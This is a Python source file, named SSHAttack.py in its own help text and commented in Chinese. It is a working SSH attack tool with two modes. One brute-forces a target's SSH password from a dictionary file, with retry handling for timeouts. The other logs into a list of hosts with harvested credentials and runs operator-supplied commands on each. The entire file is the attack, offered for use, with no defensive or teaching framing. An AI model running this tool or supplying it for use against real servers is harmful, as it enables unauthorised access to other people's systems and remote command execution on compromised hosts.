import sys
# 判断操作系统
if sys.platform in ['win32','win64']:
    print('[-] Only for Unix or Linux systems!')
    exit()
from optparse import OptionParser
import time
from pexpect import pxssh

Fail = 0

# 尝试ssh连接，来爆破密码
def connect(target,user,passwd):
    global Fail

    try:
        ssh = pxssh.pxssh()
        ssh.login(target,user,passwd)
        print('\n[+] Password founded : %s'%passwd)
        ssh.close()
        return True
    except Exception as e:
        if 'read_nonblocking' in str(e):
            Fail += 1
            time.sleep(5)
            connect(target,user,passwd)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(target,user,passwd)
        else:
            return False

# 读取密码字典
def getpasswds(file):
    try:
        f = open(file,'r')
        passwds = f.readlines()
        f.close()
        return passwds
    except :
        print("[-] Open/read password file failed")
        return False

# 判断爆破时的输入
def check(raw):
    if len(raw) != 3:
        print("[-] Parameter error")
        return False
    else:
        return True

# 批量远程执行代码
def executecmd(target,user,passwd,cmd):
    try:
        ssh = pxssh.pxssh()
        ssh.login(target,user,passwd)
    except :
        print("[-] %s is no longer available!"%target)
        return
    try:
        ssh.sendline(cmd)
        ssh.prompt()
        print("[+] %s output:\n%s"%(target,ssh.before.decode('utf-8').strip()))
        ssh.close()
    except :
        print("[-] %s Command execution failed!"%target)
        return

# 读取目标ip，用户，密码
def gettarget(file):
    try:
        f = open(file,"r")
        tamp = f.readlines()
        f.close()
    except :
        print("[-] Open/read targets file failed")
        return False
    targets = []
    try:
        for target in tamp:
            target = target.strip()
            target = target.split(' ')
            if len(target) != 3:
                print("[-] The file contents are not properly formatted")
                return False
            targets.append(target)
        return targets
    except:
        print("[-] Open/read targets file failed")
        return False

if __name__ == "__main__":
    # 设置命令行参数
    parse = OptionParser()
    parse.add_option('-m','--mode',dest='mode',type='int',help='The mode you want. 1:burst mode 2:Batch remote execution')
    (options,args) = parse.parse_args()
    
    if options.mode:
        if options.mode == 1:
            print("""
            SSH Cryptographic Burst Mode

    Input the destination, user, and password file.
    They are separated by a space.
    Example: 192.168.220.140 root ssh.txt
            """)
            while 1:
                raw = input("[*] Input the target ip,user and password file:")
                raw = raw.split(' ')
                if not check(raw):
                    continue
                passwds = getpasswds(raw[2])
                if not passwds:
                    continue
                break
            # 显示进行中的动画
            count = 0
            chartlist = ['\\','|','/','-']
            for passwd in passwds:
                sys.stdout.write('\r'+' '*30)
                sys.stdout.write('\r[*] Start to Brute force '+chartlist[count%4]+'.')
                sys.stdout.flush()
                count += 1
                flag = connect(raw[0],raw[1],passwd.strip())
                if flag:
                    break
                if Fail > 5:
                    print('[!] Exiting: Too Many Socket Timeouts')
            if not flag:
                print('\n[-] Password not found')
        elif options.mode == 2:
            print("""
        SSH Batch Remote Execution Command Mode

    Input the targets file first. Example: targets.txt
    Input the command for remote execution. Example: whoami
    Raw in target.txt for example: 192.168.220.140 user passwd
            """)
            while 1:
                f = input("[*] Input the targets file:")
                if gettarget(f):
                    targets = gettarget(f)
                    break
            while 1:
                cmd = input("[*] Input the command:")
                if cmd == "exit":
                    break
                for target in targets:
                    executecmd(target[0].strip(),target[1].strip(),target[2].strip(),cmd)
        else:
            print("[-] Error mode.\n")
    else:
        parse.print_help()
        print('\nExample:')
        print('[#]-> python SSHAttack.py -m 1')
        print('[#]-> python SSHAttack.py -m 2\n')